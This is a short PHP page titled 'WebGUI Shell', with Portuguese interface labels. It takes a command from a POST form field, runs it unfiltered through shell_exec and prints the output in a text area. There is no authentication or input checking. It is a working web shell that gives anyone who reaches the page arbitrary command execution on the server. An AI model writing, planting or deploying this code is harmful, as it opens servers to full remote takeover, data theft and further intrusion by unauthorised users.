<?php
$comando = $_POST['comando'];
$resultado = shell_exec("$comando");
?>
<html>
<head>
<title>WebGUI Shell</title>
<script language="JavaScript">
window.onload = function() {
  document.getElementById("comando").focus();
};
</script>
</head>
<body>
<h1 class="titulo">WebGUI Shell</h1>
<h3>Comando</h3>
<form name="form1" action="modelo.php" method="POST">
<input size="149" type="text" name="comando" id="comando" />
<input type="submit" value="Executar Comando" />
</form>
<h3>Saida da linha de comando</h3>
<textarea rows="35" cols="170">
<?php
	echo $resultado;
?>
</textarea>
</body>
</html>
